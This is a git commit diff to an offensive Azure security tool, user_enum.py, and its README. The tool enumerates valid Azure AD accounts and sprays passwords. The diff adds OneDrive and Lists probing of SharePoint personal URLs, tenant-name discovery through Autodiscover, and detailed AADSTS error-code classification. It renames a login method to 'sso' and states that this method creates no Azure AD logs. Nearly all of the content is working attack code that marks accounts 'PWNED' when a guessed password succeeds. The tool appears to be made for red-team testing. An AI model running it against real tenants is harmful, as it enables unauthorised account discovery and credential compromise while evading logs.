fe375c334127de001bcfe6bc22fcecffc5e9c81b
Cody Martin <cody.martin@blacklanternsecurity.com>
2022-04-27 00:19:04 -0400

    Expanding capability of user_enum in terms of user enumeration AND password spraying.

--- offensive_azure/User_Enum/README.md
+++ offensive_azure/User_Enum/README.md
@@ -5,30 +5,32 @@ usage: user_enum.py [-m login-method | -u username | -i input-list | -o outfile]
 
   =====================================================================================
   # This module will enumerate for valid user accounts in an Azure AD environment     #
-  # There are three methods to enumerate with: login, autologon, normal                                                #
+  # There are five methods to enumerate with: login, sso, normal, onedrive, lists     #
   #                                                                                   #
   # Default method: normal                                                            #
   #                                                                                   #
   # You may supply either a single username to test, or a user list                   #
-  # Supplying a password will insert it into either the 'login' or 'autologon' method #
-  # If the password is correct, account will be marked 'PWNED'                        #
+  # Supplying a password will insert it into either the 'login' or 'sso' method       #
+  #                                                                                   #
+  # If the password is correct, and there are no other obstacles, then the account    #
+  # will be marked 'PWNED'                                                            #
   #                                                                                   #
   # Using the 'login' method will create failed authentication logs in Azure AD       #
   #                                                                                   #
-  # Using the 'autologon' method will not create any logs, but is less accurate       #
+  # Using the 'sso' 'lists' or 'onedrive' methods will not create any logs,           #
+  # but is less accurate                                                              #
   =====================================================================================
 
 optional arguments:
   -h, --help            show this help message and exit
   -m <method>, --method <method>
-                        The login method you would like to use (default is normal), select one of 'normal' 'login'
-                        'autologon'
+                        The login method you would like to use (default is normal), select one of 'normal' 'onedrive' 'lists' 'login' 'sso'
   -u <test@domain.com>, --username <test@domain.com>
                         The username you would like to test
   -i </path/to/usernames.txt>, --input-list </path/to/usernames.txt>
                         Text file containing usernames you want to test
   -p <password>, --password <password>
-                        The password you want to spray with. Only works with 'login' and 'autologon' methods.
+                        The password you want to spray with. Only works with 'login' and 'sso' methods.
   -o </path/to/output/directory/>, --outfile </path/to/output/directory/>
                         Path to where you want to save your results
 ```
--- offensive_azure/User_Enum/user_enum.py
+++ offensive_azure/User_Enum/user_enum.py
@@ -40,26 +40,119 @@ RESET = colorama.Style.RESET_ALL
 # Set up argparse stuff
 METHODS = [
 	'normal',
+	'onedrive',
+	'lists',
 	'login',
-	'autologon'
+	'sso'
 ]
 
 DESCRIPTION = f'''
   =====================================================================================
   # This module will enumerate for valid user accounts in an Azure AD environment     #
-  # There are three methods to enumerate with: login, autologon, normal               #
+  # There are five methods to enumerate with: login, sso, normal, onedrive, lists     #
   #                                                                                   #
   # Default method: normal                                                            #
   #                                                                                   #
   # You may supply either a single username to test, or a user list                   #
-  # Supplying a password will insert it into either the 'login' or 'autologon' method #
-  # If the password is correct, account will be marked 'PWNED'                        #
+  # Supplying a password will insert it into either the 'login' or 'sso' method       #
+  #                                                                                   #
+  # If the password is correct, and there are no other obstacles, then the account    #
+  # will be marked 'PWNED'                                                            #
   #                                                                                   #
   #{DANGER} Using the 'login' method will create failed authentication logs in Azure AD {RESET}      #
   #                                                                                   #
-  #{WARNING} Using the 'autologon' method will not create any logs, but is less accurate {RESET}      #
+  #{WARNING} Using the 'sso' 'lists' or 'onedrive' methods will not create any logs,{RESET}           #
+  #{WARNING} but is less accurate{RESET}                                                              #
   =====================================================================================
 '''
+
+def enumerate_tenant_domains(domain, user_agent='AutodiscoverClient'):
+	"""Given a domain and optional user_agent, returns domains under shared tenant"""
+	headers = {
+		'Content-Type': 'text/xml; charset=utf-8',
+		'SOAPAction': '"http://schemas.microsoft.com/exchange/2010' \
+			'/Autodiscover/Autodiscover/GetFederationInformation"',
+		'User-Agent': user_agent
+	}
+
+	xml = f'''<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:exm="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:ext="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:a="http://www.w3.org/2005/08/addressing" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+	<soap:Header>
+		<a:Action soap:mustUnderstand="1">http://schemas.microsoft.com/exchange/2010/Autodiscover/Autodiscover/GetFederationInformation</a:Action>
+		<a:To soap:mustUnderstand="1">https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc</a:To>
+		<a:ReplyTo>
+			<a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address>
+		</a:ReplyTo>
+	</soap:Header>
+	<soap:Body>
+		<GetFederationInformationRequestMessage xmlns="http://schemas.microsoft.com/exchange/2010/Autodiscover">
+			<Request>
+				<Domain>{domain}</Domain>
+			</Request>
+		</GetFederationInformationRequestMessage>
+	</soap:Body>
+</soap:Envelope>'''
+
+	endpoint = 'https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc'
+
+	# Get Tenant Domains with Supplied Domain
+	# Returns a SOAP Envelope object
+	# Loops until we receive valid data
+	proceed = False
+	while not proceed:
+		tenant_domains = requests.post(endpoint, data=xml, headers=headers)
+		if tenant_domains.status_code == 421:
+			return None
+		tenant_domains.encoding = 'utf-8'
+		try:
+			xml_response = ET.fromstring(str(tenant_domains.content, 'utf-8'))
+			proceed = True
+		except ET.ParseError:
+			continue
+
+	domains = []
+
+	for i in xml_response[1][0][0][3]:
+		domains.append(i.text)
+
+	return domains
+
+def find_tenant_name(email, target):
+	"""Given an email account and application to target, will return the valid tenant name"""
+	if target == 'onedrive':
+		page = 'onedrive.aspx'
+	elif target == 'lists':
+		page = 'Lists.aspx'
+	else:
+		print(f'{DANGER}[!]{RESET} Something crazy happened - Exiting')
+		sys.exit()
+	domain = email.split('@')[1]
+	user_domain_1 = email.replace('@','_').replace('.','_')
+	domain_list = enumerate_tenant_domains(domain)
+	tenant_names = []
+	valid_tenant_name = None
+	for entry in domain_list:
+		if '.onmicrosoft.com' in entry:
+			tenant_names.append(entry.split('.')[0])
+	if len(tenant_names) > 1:
+		print(f'{VALID}[-]{RESET} Attempting to find the correct tenant name')
+		print(f'{VALID}[-]{RESET} This might take a little while depending' \
+			f' on the number of potential tenant names ({len(tenant_names)})')
+		print()
+		for tenant_name in tenant_names[::-1]:
+			endpoint = f'https://{tenant_name}-my.sharepoint.com/personal/{user_domain_1}/' \
+				f'_layouts/15/{page}'
+			try:
+				requests.head(endpoint, timeout=10)
+				valid_tenant_name = tenant_name
+				print(f'{VALID}[+]{RESET} Tenant Name: {valid_tenant_name}')
+				print()
+				break
+			except requests.exceptions.ConnectTimeout:
+				pass
+	elif len(tenant_names) == 1:
+		valid_tenant_name = tenant_names[0]
+	return valid_tenant_name
 
 def main():
 	"""
@@ -103,7 +196,7 @@ def main():
 							dest='password',
 							type=str,
 							help='The password you want to spray with. Only works with '\
-										'\'login\' and \'autologon\' methods.',
+										'\'login\' and \'sso\' methods.',
 							required=False)
 	arg_parser.add_argument('-o',
 							'--outfile',
@@ -178,14 +271,56 @@ def main():
 				exists = '???'
 			else:
 				if json_response['IfExistsResult'] == 0 or json_response['IfExistsResult'] == 6:
-					exists = 'VALID'
+					exists = 'VALID_USER'
 				else:
-					exists = 'INVALID'
+					exists = 'INVALID_USER'
 
 			results.append({
 				'account': user,
 				'exists': exists
 			})
+
+	elif args.method == 'onedrive':
+		print(f'{WARNING}[!]{RESET} This will only discover accounts that have M365 licenses')
+		valid_tenant_name = find_tenant_name(userlist[0], args.method)
+		if valid_tenant_name:
+			for user in userlist:
+				user_domain = user.replace('@','_').replace('.','_')
+				onedrive_endpoint = f'https://{valid_tenant_name}-my.sharepoint.com' \
+					f'/personal/{user_domain}/_layouts/15/onedrive.aspx'
+				user_check = requests.get(onedrive_endpoint)
+				user_check_status = user_check.status_code
+				exists = 'INVALID_USER'
+				if user_check_status in [200, 302, 401, 403]:
+					exists = 'VALID_USER'
+				results.append({
+						'account': user,
+						'exists': exists
+				})
+		else:
+			print(f'{WARNING}[?]{RESET} Valid tenant name was not determined. Exiting.')
+			sys.exit()
+
+	elif args.method == 'lists':
+		print(f'{WARNING}[!]{RESET} This will only discover accounts that have M365 licenses')
+		valid_tenant_name = find_tenant_name(userlist[0], args.method)
+		if valid_tenant_name:
+			for user in userlist:
+				user_domain = user.replace('@','_').replace('.','_')
+				lists_endpoint = f'https://{valid_tenant_name}-my.sharepoint.com' \
+					f'/personal/{user_domain}/_layouts/15/Lists.aspx'
+				user_check = requests.get(lists_endpoint)
+				user_check_status = user_check.status_code
+				exists = 'INVALID_USER'
+				if user_check_status in [200, 302, 401, 403]:
+					exists = 'VALID_USER'
+				results.append({
+						'account': user,
+						'exists': exists
+				})
+		else:
+			print(f'{WARNING}[?]{RESET} Valid tenant name was not determined. Exiting.')
+			sys.exit()
 
 	elif args.method == 'login':
 		for user in userlist:
@@ -212,26 +347,50 @@ def main():
 			except KeyError:
 				response_code = json_response['error_description'].split(':')[0]
 				if response_code == 'AADSTS50053':
-					# The account is locked, you've tried to sign in too many
-					# times with an incorrect user ID or password.
+					# The account is locked, you've tried to sign in
+					# too many times with an incorrect user ID or password.
 					exists = 'LOCKED'
 				elif response_code == 'AADSTS50126':
 					# Error validating credentials due to invalid username or password.
-					exists = 'VALID'
-				elif response_code == 'AADSTS50076':
-					# Due to a configuration change made by your administrator, or because you
-					# moved to a new location, you must use multi-factor authentication to access
+					exists = 'VALID_USER'
+				elif response_code in ['AADSTS50076', 'AADSTS50079']:
+					# Due to a configuration change made by your administrator, or because you moved to a new
+					# location, you must use multi-factor authentication to access
 					exists = 'MFA'
 				elif response_code == 'AADSTS700016':
-					# Application with identifier '{appIdentifier}' was not found in the directory
-					# '{tenantName}'. This can happen if the application has not been installed by
-					# the administrator of the tenant or consented to by any user in the tenant.
+					# Application with identifier '{appIdentifier}' was not found in the directory '{tenantName}'.
+					# This can happen if the application has not been installed by the administrator of the
+					# tenant or consented to by any user in the tenant.
 					# You may have sent your authentication request to the wrong tenant.
-					exists = 'VALID'
+					exists = 'VALID_USER'
 				elif response_code == 'AADSTS50034':
 					# The user account {identifier} does not exist in the {tenant} directory.
 					# To sign into this application, the account must be added to the directory.
-					exists = 'INVALID'
+					exists = 'INVALID_USER'
+				elif response_code == 'AADSTS50128':
+					# Tenant for account does not exist.
+					exists = 'INVALID_TENANT'
+				elif response_code == 'AADSTS90072':
+					# Valid credential, not for this tenant
+					exists = 'WRONG_TENANT'
+				elif response_code == 'AADSTS50055':
+					# User password is expired
+					exists = 'EXPIRED_PASS'
+				elif response_code == 'AADSTS50131':
+					# Login blocked
+					exists = 'LOGIN_BLOCKED'
+				elif response_code == 'AADSTS50158':
+					# Conditional Access
+					exists = 'CONDITIONAL_ACCESS'
+				elif response_code == 'AADSTS50056':
+					# No password
+					exists = 'NO_PASS'
+				elif response_code == 'AADSTS80014':
+					# PTA time exceeded
+					exists = 'PTA_EXCEEDED'
+				elif response_code == 'AADSTS50057':
+					# Account disabled
+					exists = 'DISABLED'
 				else:
 					exists = '???'
 
@@ -240,7 +399,7 @@ def main():
 				'exists': exists
 			})
 
-	elif args.method == 'autologon':
+	elif args.method == 'sso':
 		for user in userlist:
 			rand_uuid = client_id
 			message_id = str(uuid.uuid4()).upper()
@@ -256,35 +415,35 @@ def main():
 									f'/trust/2005/usernamemixed?client-request-id={rand_uuid}'
 
 			xml = f'''<?xml version='1.0' encoding='UTF-8'?>
-		<s:Envelope xmlns:s='http://www.w3.org/2003/05/soap-envelope' xmlns:wsse='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd' xmlns:saml='urn:oasis:names:tc:SAML:1.0:assertion' xmlns:wsp='http://schemas.xmlsoap.org/ws/2004/09/policy' xmlns:wsu='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd' xmlns:wsa='http://www.w3.org/2005/08/addressing' xmlns:wssc='http://schemas.xmlsoap.org/ws/2005/02/sc' xmlns:wst='http://schemas.xmlsoap.org/ws/2005/02/trust' xmlns:ic='http://schemas.xmlsoap.org/ws/2005/05/identity'>
-		    <s:Header>
-		        <wsa:Action s:mustUnderstand='1'>http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action>
-		        <wsa:To s:mustUnderstand='1'>{endpoint}</wsa:To>
-		        <wsa:MessageID>urn:uuid:{message_id}</wsa:MessageID>
-		        <wsse:Security s:mustUnderstand="1">
-		            <wsu:Timestamp wsu:Id="_0">
-		                <wsu:Created>{created_utc}</wsu:Created>
-		                <wsu:Expires>{expires_utc}</wsu:Expires>
-		            </wsu:Timestamp>
-		            <wsse:UsernameToken wsu:Id="uuid-{username_token}">
-		                <wsse:Username>{user}</wsse:Username>
-		                <wsse:Password>{password}</wsse:Password>
-		            </wsse:UsernameToken>
-		        </wsse:Security>
-		    </s:Header>
-		    <s:Body>
-		        <wst:RequestSecurityToken Id='RST0'>
-		            <wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType>
-		                <wsp:AppliesTo>
-		                    <wsa:EndpointReference>
-		                        <wsa:Address>urn:federation:MicrosoftOnline</wsa:Address>
-		                    </wsa:EndpointReference>
-		                </wsp:AppliesTo>
-		                <wst:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</wst:KeyType>
-		        </wst:RequestSecurityToken>
-		    </s:Body>
-		</s:Envelope>
-		'''
+<s:Envelope xmlns:s='http://www.w3.org/2003/05/soap-envelope' xmlns:wsse='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd' xmlns:saml='urn:oasis:names:tc:SAML:1.0:assertion' xmlns:wsp='http://schemas.xmlsoap.org/ws/2004/09/policy' xmlns:wsu='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd' xmlns:wsa='http://www.w3.org/2005/08/addressing' xmlns:wssc='http://schemas.xmlsoap.org/ws/2005/02/sc' xmlns:wst='http://schemas.xmlsoap.org/ws/2005/02/trust' xmlns:ic='http://schemas.xmlsoap.org/ws/2005/05/identity'>
+    <s:Header>
+        <wsa:Action s:mustUnderstand='1'>http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action>
+        <wsa:To s:mustUnderstand='1'>{endpoint}</wsa:To>
+        <wsa:MessageID>urn:uuid:{message_id}</wsa:MessageID>
+        <wsse:Security s:mustUnderstand="1">
+            <wsu:Timestamp wsu:Id="_0">
+                <wsu:Created>{created_utc}</wsu:Created>
+                <wsu:Expires>{expires_utc}</wsu:Expires>
+            </wsu:Timestamp>
+            <wsse:UsernameToken wsu:Id="uuid-{username_token}">
+                <wsse:Username>{user}</wsse:Username>
+                <wsse:Password>{password}</wsse:Password>
+            </wsse:UsernameToken>
+        </wsse:Security>
+    </s:Header>
+    <s:Body>
+        <wst:RequestSecurityToken Id='RST0'>
+            <wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType>
+                <wsp:AppliesTo>
+                    <wsa:EndpointReference>
+                        <wsa:Address>urn:federation:MicrosoftOnline</wsa:Address>
+                    </wsa:EndpointReference>
+                </wsp:AppliesTo>
+                <wst:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</wst:KeyType>
+        </wst:RequestSecurityToken>
+    </s:Body>
+</s:Envelope>
+'''
 
 			response = requests.post(endpoint, data=xml)
 			if response.status_code != 400:
@@ -292,15 +451,14 @@ def main():
 			else:
 				xml_response = ET.fromstring(str(response.content, 'utf-8'))
 				response_code = xml_response[1][0][2][0][1][1].text.split(':')[0]
-
 				if response_code == 'AADSTS50053':
 					# The account is locked, you've tried to sign in
 					# too many times with an incorrect user ID or password.
 					exists = 'LOCKED'
 				elif response_code == 'AADSTS50126':
 					# Error validating credentials due to invalid username or password.
-					exists = 'VALID'
-				elif response_code == 'AADSTS50076':
+					exists = 'VALID_USER'
+				elif response_code in ['AADSTS50076', 'AADSTS50079']:
 					# Due to a configuration change made by your administrator, or because you moved to a new
 					# location, you must use multi-factor authentication to access
 					exists = 'MFA'
@@ -309,11 +467,35 @@ def main():
 					# This can happen if the application has not been installed by the administrator of the
 					# tenant or consented to by any user in the tenant.
 					# You may have sent your authentication request to the wrong tenant.
-					exists = 'VALID'
+					exists = 'VALID_USER'
 				elif response_code == 'AADSTS50034':
 					# The user account {identifier} does not exist in the {tenant} directory.
 					# To sign into this application, the account must be added to the directory.
-					exists = 'INVALID'
+					exists = 'INVALID_USER'
+				elif response_code == 'AADSTS50128':
+					# Tenant for account does not exist.
+					exists = 'INVALID_TENANT'
+				elif response_code == 'AADSTS90072':
+					# Valid credential, not for this tenant
+					exists = 'WRONG_TENANT'
+				elif response_code == 'AADSTS50055':
+					# User password is expired
+					exists = 'EXPIRED_PASS'
+				elif response_code == 'AADSTS50131':
+					# Login blocked
+					exists = 'LOGIN_BLOCKED'
+				elif response_code == 'AADSTS50158':
+					# Conditional Access
+					exists = 'CONDITIONAL_ACCESS'
+				elif response_code == 'AADSTS50056':
+					# No password
+					exists = 'NO_PASS'
+				elif response_code == 'AADSTS80014':
+					# PTA time exceeded
+					exists = 'PTA_EXCEEDED'
+				elif response_code == 'AADSTS50057':
+					# Account disabled
+					exists = 'DISABLED'
 				else:
 					exists = '???'
 			results.append({
@@ -324,9 +506,9 @@ def main():
 	for result in results:
 		if result['exists'] == 'PWNED':
 			print(f'{SUCCESS}[+]{RESET} {result["account"]} : {SUCCESS}{result["exists"]}{RESET}')
-		elif result['exists'] == 'VALID' or result['exists'] == 'MFA' or result['exists'] == 'LOCKED':
+		elif result['exists'] == 'VALID_USER':
 			print(f'{VALID}[+]{RESET} {result["account"]} : {VALID}{result["exists"]}{RESET}')
-		elif result['exists'] == 'INVALID':
+		elif result['exists'] in ['INVALID_USER','INVALID_TENANT']:
 			print(f'{DANGER}[-]{RESET} {result["account"]} : {DANGER}{result["exists"]}{RESET}')
 		else:
 			print(f'{WARNING}[?]{RESET} {result["account"]} : {WARNING}{result["exists"]}{RESET}')
